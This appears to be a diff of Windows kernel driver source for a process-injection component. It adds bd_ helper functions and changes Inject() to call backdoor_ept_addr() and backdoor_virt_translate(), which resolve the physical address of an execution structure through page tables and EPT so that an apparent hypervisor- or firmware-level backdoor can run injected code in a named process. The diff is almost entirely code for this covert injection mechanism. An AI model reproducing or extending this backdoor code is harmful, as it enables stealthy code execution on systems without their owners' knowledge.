@@ -21,6 +21,46 @@ typedef NTSTATUS (NTAPI * func_RtlCreateUserThread)(
 
 HANDLE m_hEvent = NULL;
 //--------------------------------------------------------------------------------------
+void *bd_alloc(size_t size)
+{
+    // heap alloc
+    return ExAllocatePool(NonPagedPool, size);
+}
+
+void bd_free(void *addr)
+{
+    // heap free
+    ExFreePool(addr);
+}
+
+void bd_sleep(int msec)
+{
+    // not implemented
+}
+
+void bd_yeld(void)
+{
+    // not implemented
+}
+
+void bd_printf(char *format, ...)
+{
+
+#ifdef DBG
+
+    va_list arg;
+    char buff[DBG_BUFF_SIZE];
+
+    va_start(arg, format);
+    vsprintf(buff, format, arg);
+    va_end(arg);
+
+    DbgPrint(buff);
+
+#endif
+
+}
+//--------------------------------------------------------------------------------------
 HANDLE InjectFindProcess(PWSTR lpszProcessName, PEPROCESS *Process)
 {
     HANDLE hProcess = NULL;
@@ -195,6 +235,8 @@ BOOLEAN Inject(PWSTR lpszProcessName, PUCHAR Data, ULONG DataSize)
         PVOID Map = (PVM_EXEC_INFO)MmMapIoSpace(Addr, PAGE_SIZE, MmNonCached);
         if (Map)
         {
+            uint64_t EptAddr = 0;
+
             // get pointer to the VM_EXEC_STRUCT and VM_EXEC_INFO
             PVM_EXEC_INFO pExecInfo = (PVM_EXEC_INFO)RVATOVA(Map, VM_EXEC_INFO_ADDR);
             PVM_EXEC_STRUCT pExecStruct = (PVM_EXEC_STRUCT)RVATOVA(Image, Rva);
@@ -207,10 +249,23 @@ BOOLEAN Inject(PWSTR lpszProcessName, PUCHAR Data, ULONG DataSize)
 
             pExecStruct->control = VM_EXEC_CTL_READY;
 
-            // save pointer to the VM_EXEC_STRUCT at the end of the KUSER_SHARED_DATA memory page
+            // initialize VM_EXEC_STRUCT
             pExecInfo->signature = VM_EXEC_INFO_SIGN;
             pExecInfo->page_dir = cr3_get();
-            pExecInfo->struct_addr = pExecStruct;
+            pExecInfo->struct_addr = 0;
+
+            if (backdoor_ept_addr(&EptAddr) == 0)
+            {
+                // get VM_EXEC_STRUCT physical address
+                if (backdoor_virt_translate((uint64_t)pExecStruct, &pExecInfo->struct_addr, cr3_get(), EptAddr) != 0)
+                {
+                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_virt_translate() fails\n");
+                }
+            }
+            else
+            {
+                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_ept_addr() fails\n");
+            }
 
             // unmap processor start block
             MmUnmapIoSpace(Map, PAGE_SIZE);
